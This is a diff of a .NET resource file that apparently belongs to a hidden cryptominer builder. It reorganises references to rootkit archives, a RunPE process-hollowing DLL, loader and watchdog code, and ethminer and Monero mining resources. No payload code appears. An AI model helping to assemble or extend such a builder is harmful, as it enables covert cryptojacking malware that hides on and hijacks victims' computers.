@@ -133,9 +133,6 @@
   <data name="Watchdog" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Code\Watchdog.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
-  <data name="rootkit_i" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\rootkit-i.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="Monero" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Images\Monero.ico;System.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
@@ -150,9 +147,6 @@
   </data>
   <data name="Compilers" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Compilers\Compilers.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
-  <data name="rootkit_u" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\rootkit-u.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
   <data name="ethminer" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Miners\ethminer.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
@@ -178,13 +172,22 @@
   <data name="Loader" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Code\Loader.c;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
-  <data name="RunPE" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\RunPE.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="template" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Compilers\template.manifest-miner;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
   <data name="resource" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Compilers\resource.rcf;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="rootkit_i" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Rootkit\rootkit-i.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="rootkit_u" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Rootkit\rootkit-u.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="RunPE" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Modules\RunPE.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="LocalizedControls" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\LocalizedControls.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
 </root>
